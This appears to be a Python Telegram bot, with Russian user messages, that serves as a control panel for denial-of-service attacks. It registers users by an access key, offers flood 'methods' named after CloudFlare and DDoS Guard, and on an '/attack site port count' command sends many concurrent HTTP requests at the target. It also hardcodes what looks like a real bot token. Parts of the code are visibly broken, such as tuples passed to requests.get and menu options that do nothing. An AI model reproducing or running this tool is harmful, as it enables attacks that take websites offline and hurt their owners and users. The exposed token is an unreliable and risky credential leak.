import telebot
from telebot import types
import requests
import concurrent.futures
import time

bot_token = '6696438979:AAFQ22gFgWMT-eoVda-a_EZBfE_zkOBCMB0'

access_key = '4466AVD'

bot = telebot.TeleBot(bot_token)

registered_users = []
user_message_counts = {}
attack_started = False

@bot.message_handler(commands=['start'])
def start(message):
    
    if message.from_user.id in registered_users:
        bot.send_message(chat_id=message.chat.id, text="Вы уже зарегистрированы.")
    elif message.text == f"/start {access_key}":
        registered_users.append(message.from_user.id) 
        markup = types.ReplyKeyboardMarkup(row_width=2)
        attack_btn = types.KeyboardButton(text="Method Attack")
        start_btn = types.KeyboardButton(text="Start Attack")
        markup.add(attack_btn, start_btn)
        bot.send_message(chat_id=message.chat.id, text=f"Регистрация прошла успешно!", reply_markup=markup)
        
    else:
        bot.send_message(chat_id=message.chat.id, text="У вас нет доступа к боту.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):

    global attack_started
    
    sender_id = message.from_user.id
    text = message.text
    
    if text == "Method Attack":
    
        markup = types.ReplyKeyboardMarkup(row_width=2)
        cloudflare_btn = types.KeyboardButton(text="CloudFlare")
        ddosguard_btn = types.KeyboardButton(text="DDoS Guard")
        httpflood_btn = types.KeyboardButton(text="HTTP FLOOD")
        getflood_btn = types.KeyboardButton(text="REQUEST FLOOD")
        postflood_btn = types.KeyboardButton(text="POST FLOOD")
        markup.add(cloudflare_btn, ddosguard_btn, httpflood_btn, getflood_btn, postflood_btn)
        bot.send_message(chat_id=sender_id, text="method attack:", reply_markup=markup)
        
    elif text == "Start Attack":
        
        if not attack_started:
            attack_started = True
            bot.send_message(chat_id=sender_id, text="Введите ссылку на сайт и порт (например: /attack example.com 443 300)")
            
        else:
            bot.send_message(chat_id=sender_id, text="attack sent")
            
    elif text.startswith("/attack"):
        
        if not attack_started:
            attack_started = True
            args = text.split()
            if len(args) == 4:
                website = args[1]
                port = args[2]
                num_requests = int(args[3])
                bot.send_message(chat_id=sender_id, text=f"Атака запущена на {website}:{port} с {num_requests} запросами.")
                attack_website(website, port, num_requests)
            else:
                bot.send_message(chat_id=sender_id, text="Неправильный формат команды. Введите ссылку на сайт и порт (например: /attack example.com 443 300)")
        else:
            bot.send_message(chat_id=sender_id, text="attack sent")
            
    else:
    
        if sender_id in user_message_counts:
            user_message_counts[sender_id] += 1
        else:
            user_message_counts[sender_id] = 1
        
        if user_message_counts[sender_id] > 999999999999:
            bot.send_message(chat_id=message.chat.id, text="Вы превысили лимит сообщений. Ваш аккаунт заблокирован.")
            bot.kick_chat_member(chat_id=message.chat.id, user_id=sender_id)
        else:
            bot.send_message(chat_id=sender_id, text="Доступ запрещен.")

def attack_website(website, port, num_requests):
 
    def send_request(url):
        try:
            response = requests.get(url)

            print(f"Request sent to {url} - Status code: {response.status_code}")
        except Exception as e:

            print(f"Error sending request to {url}: {str(e)}")

    url = f"http://{website}:{port}"
    tasks = [(url,)] * num_requests
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(send_request, tasks)
    

bot.polling()